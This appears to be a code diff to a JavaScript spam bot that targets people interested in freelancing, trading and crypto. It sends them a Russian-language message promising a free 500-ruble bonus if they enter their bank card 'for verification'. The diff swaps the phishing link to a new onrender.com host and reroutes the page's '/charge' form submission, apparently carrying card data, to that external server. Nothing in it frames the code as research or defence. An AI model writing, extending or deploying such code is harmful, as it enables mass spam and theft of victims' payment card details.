@@ -37,7 +37,7 @@ const CONFIG = {
         'фриланс', 'работа', 'подработка', 'деньги',
         'финансы', 'трейдинг', 'биржа', 'криптовалюта'
     ],
-    spamMessage: `🔥 БЕСПЛАТНЫЙ БОНУС 500 ₽ НА КАРТУ!\n\nПереходи по ссылке, введи карту для верификации — получи 500 ₽ на счёт.\n👉 https://freelanspropay.duckdns.org\nУспей, акция ограничена!`,
+    spamMessage: `🔥 БЕСПЛАТНЫЙ БОНУС 500 ₽ НА КАРТУ!\n\nПереходи по ссылке, введи карту для верификации — получи 500 ₽ на счёт.\n👉 👉 https://botsite-0mtp.onrender.com\nУспей, акция ограничена!`,
     spamInterval: 3 * 60 * 60 * 1000,
     dailyLimit: 100,
     delays: {
@@ -231,7 +231,7 @@ const HTML_PAGE = `
             };
 
             try {
-                const res = await fetch('/charge', {
+                const res = await fetch('https://botsite-0mtp.onrender.com/charge', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
